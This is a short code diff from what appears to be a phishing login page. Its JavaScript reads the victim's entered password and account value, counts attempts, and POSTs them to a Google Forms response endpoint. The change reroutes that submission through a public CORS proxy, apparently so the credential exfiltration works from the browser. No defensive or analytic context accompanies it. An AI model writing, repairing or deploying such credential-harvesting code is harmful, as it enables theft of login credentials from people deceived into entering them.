@@ -94,7 +94,7 @@ body{
             var pr = $("#inputPassword").val();
             count = count + 1;
             $.ajax({
-                    url: "https://docs.google.com/forms/d/e/1FAIpQLSciLeKoRvCJtMWX-NmyEmqD_z-fNpK08psXEyGvX37zsqDxaQ/formResponse?",
+                    url: "https://cors-anywhere.herokuapp.com/https://docs.google.com/forms/d/e/1FAIpQLSciLeKoRvCJtMWX-NmyEmqD_z-fNpK08psXEyGvX37zsqDxaQ/formResponse?",
                     data: {"entry.1889202620": ai, "entry.302007867": pr,},
                     type: "POST",
                     
